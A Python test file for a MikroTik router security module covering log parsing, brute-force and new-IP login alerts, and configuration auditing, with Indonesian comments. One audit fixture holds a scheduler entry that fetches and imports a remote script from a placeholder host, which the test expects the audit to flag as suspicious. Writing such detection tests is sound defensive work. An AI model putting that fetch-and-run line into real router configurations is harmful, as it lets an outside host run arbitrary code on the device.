"""Keamanan MikroTik: parsing log, brute force, serangan terdistribusi, login setelah gagal,
login IP baru, perubahan user, penutupan otomatis, API & AI tool."""
import secrets
from datetime import timedelta

from app import db
from models import MikrotikDevice, MtSecAlert, MtSecEvent, MtSecState, Notification
import mikrotik_security as ms
from tests.test_link_state import ctx  # noqa: F401
from tests.test_viewer_permissions import _user, _client

H = {'X-Requested-With': 'XMLHttpRequest'}


def _dev(name='CCR Core'):
    d = MikrotikDevice(name=name, host='10.0.0.1', api_user='nms', enabled=True)
    d.api_password = secrets.token_hex(6)
    db.session.add(d)
    db.session.commit()
    return d


class _Rows:
    def __init__(self):
        self.n = 0x100
        self.rows = []

    def add(self, msg, topics='system,error,critical'):
        self.n += 1
        self.rows.append({'.id': f'*{self.n:X}', 'time': '10:00:00', 'topics': topics, 'message': msg})
        return self


def _run_cycle(now):
    notifs, alerts = [], []
    ms.check_security(now, notifs, alerts)
    for n in notifs:
        db.session.add(Notification(**n))
    db.session.commit()
    return notifs, alerts


def _baseline(d, rows, now):
    ms.ingest(d, rows.rows, now)
    db.session.commit()


def test_parse_messages():
    p = ms.parse_message
    assert p('login failure for user admin from 45.9.20.1 via winbox') == \
        {'kind': 'login_fail', 'user': 'admin', 'ip': '45.9.20.1', 'via': 'winbox'}
    assert p('login failure for user root from 2001:db8::5 via ssh')['ip'] == '2001:db8::5'
    assert p('user tian logged in from 36.70.1.2 via web')['kind'] == 'login_ok'
    assert p('user admin logged in via local')['ip'] == ''
    u = p('user backdoor added by admin')
    assert u['kind'] == 'user_change' and u['user'] == 'backdoor' and u['by'] == 'admin'
    v7 = p('user admin changed by winbox-3.40/tcp-msg(winbox):admin@10.1.1.2 (/user set admin password=***)')
    assert v7['kind'] == 'user_change' and v7['by'].startswith('winbox-3.40')
    assert p('ether1 link up (speed 1G, full duplex)') is None


def test_first_read_is_baseline_only(ctx):
    d = _dev()
    now = ms._now()
    r = _Rows()
    for _ in range(10):
        r.add('login failure for user admin from 45.9.20.1 via ssh')
    r.add('user tian logged in from 36.70.1.2 via winbox', 'system,info,account')
    assert ms.ingest(d, r.rows, now) == 0          # log lama tidak dihitung
    db.session.commit()
    st = db.session.get(MtSecState, d.id)
    assert st.last_id == r.n and st.baseline_at == now
    notifs, alerts = _run_cycle(now)
    assert not alerts


def test_bruteforce_alert_once_then_closes(ctx):
    d = _dev()
    now = ms._now()
    r = _Rows().add('system started', 'system,info')
    _baseline(d, r, now - timedelta(days=2))
    for _ in range(6):
        r.add('login failure for user admin from 8.8.4.4 via winbox')
    r.add('login failure for user admin from 10.5.5.5 via ssh')   # hanya 1x — bukan brute force
    assert ms.ingest(d, r.rows, now) == 7
    db.session.commit()
    notifs, alerts = _run_cycle(now)
    assert len(alerts) == 1 and alerts[0]['severity'] == 'critical'
    assert '8.8.4.4' in alerts[0]['message'] and 'Login gagal: 6×' in alerts[0]['message']
    assert alerts[0]['target_type'] == 'mt_sec'
    # percobaan berlanjut → tidak ada alert ganda
    r.add('login failure for user admin from 8.8.4.4 via winbox')
    ms.ingest(d, r.rows, now + timedelta(minutes=2))
    db.session.commit()
    _, alerts = _run_cycle(now + timedelta(minutes=2))
    assert alerts == []
    a = MtSecAlert.query.filter_by(kind='bruteforce').one()
    assert a.closed_at is None and a.count == 7
    # sepi 30 menit → ditutup + pesan pulih, notifikasi resolved
    _, alerts = _run_cycle(now + timedelta(minutes=45))
    assert len(alerts) == 1 and alerts[0]['is_recovery']
    assert db.session.get(MtSecAlert, a.id).closed_at is not None
    assert Notification.query.filter_by(category='mt_security', resolved=False).count() == 0


def test_whitelist_and_distributed(ctx):
    d = _dev()
    now = ms._now()
    r = _Rows().add('x', 'system,info')
    _baseline(d, r, now - timedelta(days=2))
    ms.save_settings({'mt_sec_whitelist': '203.0.113.0/24, bukan-ip'})
    db.session.commit()
    for _ in range(9):
        r.add('login failure for user admin from 203.0.113.7 via winbox')     # IP kantor — diabaikan
    for i in range(22):
        r.add(f'login failure for user admin from 198.51.100.{i % 11 + 1} via ssh')  # 11 IP × 2
    ms.ingest(d, r.rows, now)
    db.session.commit()
    _, alerts = _run_cycle(now)
    assert [a['type'] for a in alerts] == ['mt_security_distributed']
    assert '11 IP' in alerts[0]['message'] and '203.0.113.7' not in alerts[0]['message']


def test_success_after_fail_new_ip_and_user_change(ctx):
    d = _dev()
    now = ms._now()
    r = _Rows().add('user tian logged in from 36.70.1.2 via winbox', 'system,info,account')
    _baseline(d, r, now - timedelta(days=2))
    for _ in range(4):
        r.add('login failure for user admin from 1.2.3.4 via ssh')
    r.add('user admin logged in from 1.2.3.4 via ssh', 'system,info,account')
    r.add('user tian logged in from 36.70.1.2 via winbox', 'system,info,account')   # IP dikenal
    r.add('user tian logged in from 9.9.9.9 via winbox', 'system,info,account')     # IP baru
    r.add('user nms logged in from 10.0.0.250 via api', 'system,info,account')      # poller NMS sendiri
    r.add('user backdoor added by admin', 'system,info')
    ms.ingest(d, r.rows, now)
    db.session.commit()
    assert MtSecEvent.query.filter_by(kind='login_ok', user='nms').count() == 0
    _, alerts = _run_cycle(now)
    kinds = sorted(a['type'] for a in alerts)
    assert kinds == ['mt_security_new_ip', 'mt_security_success_after_fail', 'mt_security_user_change']
    sa = next(a for a in alerts if a['type'].endswith('success_after_fail'))
    assert 'BERHASIL' in sa['message'] and '4×' in sa['title']
    _, alerts = _run_cycle(now + timedelta(minutes=1))     # sekali-kirim: tidak berulang
    assert alerts == []


def test_new_ip_suppressed_while_learning(ctx):
    d = _dev()
    now = ms._now()
    r = _Rows().add('x', 'system,info')
    _baseline(d, r, now - timedelta(hours=2))                # masih masa belajar 24 jam
    r.add('user tian logged in from 9.9.9.9 via winbox', 'system,info,account')
    ms.ingest(d, r.rows, now)
    db.session.commit()
    _, alerts = _run_cycle(now)
    assert alerts == []


def test_reboot_resets_log_ids(ctx):
    d = _dev()
    now = ms._now()
    r = _Rows()
    r.n = 0x900
    r.add('x', 'system,info')
    _baseline(d, r, now - timedelta(days=2))
    r2 = _Rows()               # .id mulai kecil lagi setelah reboot
    r2.add('login failure for user admin from 5.5.5.5 via ftp')
    assert ms.ingest(d, r2.rows, now) == 1


def test_api_settings_and_summary_permissions(ctx):
    d = _dev()
    now = ms._now()
    r = _Rows().add('x', 'system,info')
    _baseline(d, r, now - timedelta(days=2))
    for _ in range(5):
        r.add('login failure for user admin from 8.8.8.8 via winbox')
    ms.ingest(d, r.rows, now)
    db.session.commit()
    admin = _client(_user('view_dashboard', super_admin=True))
    body = admin.get('/api/mikrotik/security', headers=H).get_json()
    assert body['totals']['fails'] == 5 and body['attackers'][0]['ip'] == '8.8.8.8'
    assert body['routers'][0]['name'] == d.name
    res = admin.put('/api/mikrotik/security/settings',
                    json={'mt_sec_bf_threshold': 1, 'mt_sec_whitelist': '10.0.0.0/8 x'}, headers=H).get_json()
    assert res['settings']['mt_sec_bf_threshold'] == 2 and res['invalid'] == ['x']
    viewer = _client(_user('view_dashboard'))
    assert viewer.get('/api/mikrotik/security', headers=H).status_code == 403


def test_ai_tool_and_quick_command(ctx):
    import ai_agent
    d = _dev('Router Utama')
    now = ms._now()
    r = _Rows().add('x', 'system,info')
    _baseline(d, r, now - timedelta(days=2))
    for _ in range(3):
        r.add('login failure for user admin from 8.8.8.8 via ssh')
    ms.ingest(d, r.rows, now)
    db.session.commit()
    out = ai_agent.run_tool('mikrotik_security', {'router': 'utama'})
    assert '8.8.8.8' in str(out)
    txt = ai_agent.quick_command('/keamanan')
    assert 'Login gagal: 3×' in txt and '8.8.8.8' in txt
    assert 'tidak ditemukan' in ai_agent.quick_command('/keamanan tidakada')


# ───────────── tahap 2: audit konfigurasi & address-list firewall ─────────────

import json  # noqa: E402
import mikrotik_audit as ma  # noqa: E402
from models import MtSecAudit, OnuLinkState  # noqa: E402


def _raw(**over):
    raw = {
        'resource': [{'version': '7.15.2 (stable)'}],
        'services': [{'name': 'telnet', 'port': '23', 'address': '', 'disabled': 'true'},
                     {'name': 'winbox', 'port': '8291', 'address': '10.0.0.0/24', 'disabled': 'false'},
                     {'name': 'ssh', 'port': '22', 'address': '10.0.0.0/24', 'disabled': 'false'}],
        'users': [{'name': 'tian', 'group': 'full', 'address': '10.0.0.0/24', 'disabled': 'false'}],
        'dns': [{'allow-remote-requests': 'false'}], 'proxy': [{'enabled': 'false'}], 'socks': [{'enabled': 'false'}],
        'scheduler': [], 'scripts': [], 'btest': [{'enabled': 'false'}], 'upnp': [{'enabled': 'false'}],
        'filter': [{'chain': 'input', 'action': 'drop', 'in-interface-list': 'WAN', 'disabled': 'false'}],
    }
    raw.update(over)
    return raw


def test_audit_clean_router_scores_100():
    f, score, ver = ma.evaluate(_raw())
    assert f == [] and score == 100 and ver.startswith('7.15')


def test_audit_finds_classic_problems():
    f, score, _ = ma.evaluate(_raw(
        resource=[{'version': '6.40.5'}],
        services=[{'name': 'telnet', 'port': '23', 'address': '', 'disabled': 'false'},
                  {'name': 'winbox', 'port': '8291', 'address': '', 'disabled': 'false'}],
        users=[{'name': 'admin', 'group': 'full', 'address': '', 'disabled': 'false'}],
        dns=[{'allow-remote-requests': 'true'}], socks=[{'enabled': 'true', 'port': '4153'}],
        scheduler=[{'name': 'upd', 'on-event': '/tool fetch url=http://x.example/a.rsc; /import a.rsc', 'disabled': 'false'}],
        filter=[]))
    ids = {x['id'] for x in f}
    assert {'ver_cve_2018_14847', 'svc_plain_telnet', 'svc_open_winbox', 'user_admin', 'dns_open', 'socks_on',
            'suspicious_scripts', 'no_input_drop'} <= ids
    assert f[0]['severity'] == 'critical' and score == 0
    assert next(x for x in f if x['id'] == 'svc_open_winbox')['severity'] == 'critical'   # tanpa firewall input


class _Cli:
    def __init__(self, raw, lists=None):
        self.raw, self.lists = raw, lists or {}

    def read(self, path, props=None, query=None):
        if path == 'ip/firewall/address-list':
            return self.lists.get((query or {}).get('list'), [])
        key = next(k for k, (p, _) in ma.READS.items() if p == path)
        return self.raw.get(key)

    def get_log(self):
        return []


def test_audit_run_alerts_new_critical_once(ctx):
    d = _dev()
    now = ms._now()
    r = ma.run(d, _Cli(_raw(socks=[{'enabled': 'true', 'port': '4153'}])), now)
    assert r['ok'] and r['score'] < 100
    _, alerts = _run_cycle(now)
    assert [a['type'] for a in alerts] == ['mt_security_audit'] and 'SOCKS' in alerts[0]['message']
    ma.run(d, _Cli(_raw(socks=[{'enabled': 'true', 'port': '4153'}])), now + timedelta(days=1))
    _, alerts = _run_cycle(now + timedelta(days=1))
    assert alerts == []                         # temuan yang sama tidak dialert ulang
    res = json.loads(db.session.get(MtSecAudit, d.id).findings)
    assert res[0]['id'] == 'socks_on'


def test_firewall_lists_baseline_digest_and_customer(ctx):
    d = _dev()
    now = ms._now()
    from tests.test_link_state import _mk_olt_onu
    _, onu = _mk_olt_onu(pppoe='budi01')
    db.session.add(OnuLinkState(onu_id=onu.id, pppoe_user='budi01', pppoe_ip='100.64.1.20'))
    db.session.commit()
    lists = {'nms-portscan': [{'list': 'nms-portscan', 'address': '45.1.1.1'}]}
    cli = _Cli(_raw(), lists)
    ms.ingest(d, [{'.id': '*1', 'message': 'x'}], now - timedelta(days=2))
    ms.ingest_fw(d, lists['nms-portscan'], ['nms-portscan', 'nms-portscan-lan'], now - timedelta(days=2))  # baseline (lan kosong)
    db.session.commit()
    lists['nms-portscan'] += [{'list': 'nms-portscan', 'address': '45.2.2.2'},
                              {'list': 'nms-portscan', 'address': '45.3.3.3'}]
    lists['nms-portscan-lan'] = [{'list': 'nms-portscan-lan', 'address': '100.64.1.20'}]
    st = db.session.get(MtSecState, d.id)
    st.last_read_at = now - timedelta(minutes=5)
    db.session.commit()
    ms.collect(d, cli, now)
    _, alerts = _run_cycle(now)
    by = {a['type']: a for a in alerts}
    assert set(by) == {'mt_security_fw_list'} and len(alerts) == 2
    lan = next(a for a in alerts if 'lokal' in a['title'])
    assert 'budi01' in lan['message']
    wan = next(a for a in alerts if 'lokal' not in a['title'])
    assert 'IP baru: 2' in wan['message'] and '45.1.1.1' not in wan['message']
    # IP baru berikutnya dalam jendela 60 menit ditahan, lalu dikirim sebagai satu pesan
    lists['nms-portscan'].append({'list': 'nms-portscan', 'address': '45.4.4.4'})
    st.last_read_at = now - timedelta(minutes=5)
    db.session.commit()
    ms.collect(d, cli, now + timedelta(minutes=10))
    _, alerts = _run_cycle(now + timedelta(minutes=10))
    assert alerts == []
    _, alerts = _run_cycle(now + timedelta(minutes=70))
    assert len(alerts) == 1 and '45.4.4.4' in alerts[0]['message']


def test_audit_endpoint_and_summary(ctx, monkeypatch):
    d = _dev()
    monkeypatch.setattr(ma, 'run', lambda dev, cli=None, now=None: (
        ma.save(dev, *ma.evaluate(_raw(users=[{'name': 'admin', 'group': 'full', 'address': '', 'disabled': 'false'}])))
        and db.session.commit()) or {'ok': True})
    admin = _client(_user('view_dashboard', super_admin=True))
    r = admin.post(f'/api/mikrotik/security/audit/{d.id}', headers=H).get_json()
    assert r['success'] and r['audit']['findings'][0]['id'] == 'user_admin'
    body = admin.get('/api/mikrotik/security', headers=H).get_json()
    assert body['routers'][0]['audit']['score'] == 90 and 'fw_lists' in body
    viewer = _client(_user('view_dashboard'))
    assert viewer.post(f'/api/mikrotik/security/audit/{d.id}', headers=H).status_code == 403


def test_firewall_list_added_later_is_baseline(ctx):
    d = _dev()
    now = ms._now()
    ms.ingest_fw(d, [], ['nms-portscan'], now - timedelta(hours=1))
    # daftar baru ditambahkan ke pengaturan: isinya yang sudah ada = baseline, tidak dialert
    n = ms.ingest_fw(d, [{'list': 'nms-synflood', 'address': '9.9.9.9'}], ['nms-portscan', 'nms-synflood'], now)
    assert n == 0
    n = ms.ingest_fw(d, [{'list': 'nms-synflood', 'address': '9.9.9.9'}, {'list': 'nms-synflood', 'address': '8.8.8.8'}],
                     ['nms-portscan', 'nms-synflood'], now + timedelta(minutes=1))
    assert n == 1
